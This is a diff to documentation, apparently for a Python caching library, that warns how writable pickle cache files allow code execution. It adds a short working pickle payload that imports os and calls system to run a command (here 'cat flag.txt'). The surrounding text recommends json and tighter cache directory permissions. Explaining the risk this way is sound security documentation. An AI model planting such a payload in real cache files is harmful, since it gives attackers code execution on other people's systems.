@@ -468,7 +468,14 @@ If in any way we have access to the cache folder, we can easily exploit it:
     with open("./cache/1.pkl", "wb") as f:
         f.write(payload)
 
-Next time that the function is called with argumnet ``1``, we will spawn a remote shell and take control of the system.
+Or the general RCE exploit which only uses builtins.
+.. code:: python
+    command = b"""cat flag.txt"""
+    x = b"c__builtin__\ngetattr\nc__builtin__\n__import__\nS'os'\n\x85RS'system'\n\x86RS'%s'\n\x85R."%command
+    
+    
+
+Next time that the function is called with argument ``1``, we will spawn a remote shell and take control of the system.
 
 
 For this reason is important to either use a simpler serializzation scheme like json and to fortify the system by setting the cache dir to be read-write only for the current user.
